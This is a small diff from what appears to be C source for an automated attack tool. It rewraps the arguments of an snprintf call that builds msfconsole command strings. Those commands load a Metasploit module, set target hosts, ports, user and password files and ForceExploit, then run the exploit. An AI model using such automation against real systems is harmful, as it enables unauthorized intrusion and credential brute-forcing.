@@ -181,8 +181,8 @@ int any(int type){
 							"set PASS_FILE %s;"
 							"set DOMAIN %s;"
 							"set ForceExploit true;"
-							"exploit;exit'",strSearch,target.strTargetIp, portUnderHacking, networkInfo.interfaceIp, networkInfo.interfaceIp,
-							userFilePath, passFilePath,target.strTargetIp);
+							"exploit;exit'",strSearch,target.strTargetIp, portUnderHacking, networkInfo.interfaceIp,
+							networkInfo.interfaceIp,userFilePath, passFilePath,target.strTargetIp);
 				}else{
 					snprintf(cmd,sizeof(cmd),"msfconsole -q -x 'use %s;"
 							"set RHOSTS %s;"
